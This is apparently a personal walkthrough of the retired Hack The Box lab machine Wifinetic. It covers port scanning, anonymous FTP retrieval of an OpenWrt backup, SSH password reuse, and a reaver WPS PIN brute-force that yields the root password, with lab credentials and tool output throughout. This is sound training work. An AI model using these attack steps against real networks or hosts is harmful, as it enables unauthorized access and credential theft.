# [Wifinetic](https://app.hackthebox.com/machines/Wifinetic) Write Up  (HTB retired machine) 

Difficulty: **Easy** 
 
About Wifinetic

Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server. 

Steps: 

## User Flag 

0 - Test connection:
`ping <TARGET>`

Server enumeration:

1 - scan top 100 port with service info: 

`nmap -sV -F -oA results <Target>`

output: 

```
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
2 - Then scan all port for service running on non standard ports:

`nmap -sV -p- -oA full-scan <Target>`

No new info.

3 - Now add scripts:

`nmap -sV -sC -F -sC <Target>`

```
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.95
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

4 - Let s try to connect with ftp: 

`ftp -p <Target>`   then `ls` to see which files are present. 

using `get <filename>` get the files. 

tip: you can dowload multiple files with `mget`, like so: 

```
prompt
mget *
```

where `prompt` will enable interactive mode (disable with `prompt off`) and `mget *` downloads everything.

5 - Peeking at the downloaded files, found the following info:

email addresses:

`samantha.wood93@wifinetic.htb`  HR Manager
`management@wifinetic.htb`
`olivia.walker17@wifinetic.htb` Wireless Network administrator 
`info@wifinetic.htb`

Also noticed .tar file. retrieved the content with:

`tar -xvf backup-OpenWrt-2023-07-26.tar`

Exploring the content, noticed etc/passwd with content:

```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```
This gives us info about various user accounts on the system, including system users like 'root,' 'daemon,' 'ftp,' and others.
the first part (root, daemon, ftp,...,netadmin) tells us the user name/account and the second part with the `x` or `*` is typical for this field. It indicates that the actual password is stored in a separate **shadow password** file for security reasons.

In our case, there are no shadow file present. But further exploration in the etc/config/wireless yields valuable info. 

using password `VeRyUniUqWiFIPasswrd1!` we can ssh into the netadmin account. like so:

`ssh netadmin@10.10.11.247`  then enter the password. The flag will be in user.txt file 

## Root Flag

6 - Given the machine description: 

***Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ).***

let's see what info we can find about wireless interfaces. 

with `ifconfig` we get info about wireless network interfaces:

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:267a  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:267a  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:26:7a  txqueuelen 1000  (Ethernet)
        RX packets 1109  bytes 97020 (97.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 840  bytes 296124 (296.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 730  bytes 43876 (43.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 730  bytes 43876 (43.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 7398  bytes 1304871 (1.3 MB)
        RX errors 0  dropped 7398  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 244  bytes 23656 (23.6 KB)
        RX errors 0  dropped 33  overruns 0  frame 0
        TX packets 304  bytes 36165 (36.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 82  bytes 11325 (11.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 244  bytes 28048 (28.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We can see that we have mon0, wlan0, wlan1 and wlan2. 3 wireless interface; after getting help online, I learned that `iw dev` will provide info about the network configuration!

7 - with `iw dev`, I get the output:

```
phy#2
	Interface mon0
		ifindex 7
		wdev 0x200000002
		addr 02:00:00:00:02:00
		type monitor
		txpower 20.00 dBm
	Interface wlan2
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
phy#1
	Unnamed/non-netdev interface
		wdev 0x10000000a
		addr 42:00:00:00:01:00
		type P2P-device
		txpower 20.00 dBm
	Interface wlan1
		ifindex 4
		wdev 0x100000001
		addr 02:00:00:00:01:00
		ssid OpenWrt
		type managed
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
phy#0
	Interface wlan0
		ifindex 3
		wdev 0x1
		addr 02:00:00:00:00:00
		ssid OpenWrt
		type AP
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 20.00 dBm
```

We can see that `wlan0` (`phy#0`) is of **type AP** which from my understanding means this is the access point. 

Interface `m0n` is of **type monitor** which is something important to note. 

7 - Now we are looking to perform a WPS PIN attack based on the info provided on the machine. A quick search on google about WPS PIn will give info about what is a WPS PIN and why it's of interest. 

With `getcap -r / 2>/dev/null`, we can learn about files capabilities starting from the `/` folder. After running this we get the output: 

```
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```
The `cap_net_raw` capability, allows a program to perform raw socket operations, which is often needed for network-related tasks like ping and tracerout, which is of great interest to us. 

8 - Trying all the files, only `reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1` yields something of interest:

```
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from 02:00:00:00:00:00
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```

Noting down the WPA PSK `WhatIsRealAnDWhAtIsNot51121!`, let's try that to SSH as root!

9 - `ssh root@10.10.11.247` 
with password noted above. then `ls`, the flag will be in root.txt. And VOILA !

This is how is [successfuly rooted](https://www.hackthebox.com/achievement/machine/1609448/563) this retired machine. 

Credits to the Official HTB Walkthrough for helping unblock myself for the WPS PIN attack
